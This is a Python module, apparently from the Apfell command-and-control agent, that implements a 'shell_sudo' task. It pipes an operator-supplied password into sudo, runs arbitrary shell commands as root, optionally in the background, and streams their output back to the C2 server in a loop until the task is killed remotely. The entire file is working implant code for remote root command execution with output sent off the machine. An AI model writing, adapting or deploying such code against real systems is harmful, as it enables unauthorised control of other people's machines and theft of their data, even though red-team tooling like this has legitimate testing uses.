def shell_sudo(apfell, c2, params="", task_id=""):
    try:
        import subprocess
        import time
        import json
    except Exception as e:
        output = json.dumps({"user_output": "Failed to import modules", "completed": True, "status": "error"})
        c2.post_response(response=output, task_id=task_id)
        apfell.remove_job(task_id)
        return
    # execute a shell command and stream the output back to the apfell server as necessary
    try:
        json_params = json.loads(params)
        if 'background' not in json_params:
            json_params['background'] = False
        if json_params['background']:
            command = "sudo -S -b {}".format(json_params['cmd'])
        else:
            command = "sudo -S {}".format(json_params['cmd'])
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
    except Exception as e:
        output = json.dumps({"user_output": "Failed to start process: {}".format(str(e)), "completed": True, "status": "error"})
        c2.post_response(response=output, task_id=task_id)
        apfell.remove_job(task_id)
    try:
        #print("about to write in password")
        process.stdin.write(json_params['password'] + "\n\n")
        #print("just wrote in password")
    except Exception as e:
        output = json.dumps({"user_output": "Failed to write to stdin for password: {}".format(str(e)), "completed": True, "status": "error"})
        c2.post_response(response=output, task_id=task_id)
        apfell.remove_job(task_id)
        return
    while True:
        try:
            output = ""
            timeout = time.time() + c2.get_wait_time()
            for line in iter(process.stdout.readline, ''):
                output += line.decode('utf-8').encode('utf-8')
                if time.time() > timeout:
                    break
            if output != "":
                output = json.dumps({"user_output": output})
                c2.post_response(response=output, task_id=task_id)
            process.poll()
            if process.returncode is not None:
                if process.returncode != 0:
                    output = json.dumps({"user_output": "Task ended with return code {}".format(process.returncode), "completed": True, "status": "error"})
                else:
                    output = json.dumps({"completed": True})
                c2.post_response(response=output, task_id=task_id)
                break
            if apfell.should_thread_stop(task_id):
                try:
                    process.kill()
                except:
                    pass
                output = json.dumps({"user_output": "Task successfully stopped", "completed": True})
                c2.post_response(response=output, task_id=task_id)
                apfell.remove_job(task_id)
                exit()
            c2.wait()
        except Exception as e:
            #print("Exiting thread due to: {}\n".format(str(e)))
            output = json.dumps({"user_output": "Thread exited abruptly: {}".format(str(e)), "completed": True, "status": "error"})
            c2.post_response(response=output, task_id=task_id)
            break
    apfell.remove_job(task_id)
COMMAND_ENDS_HERE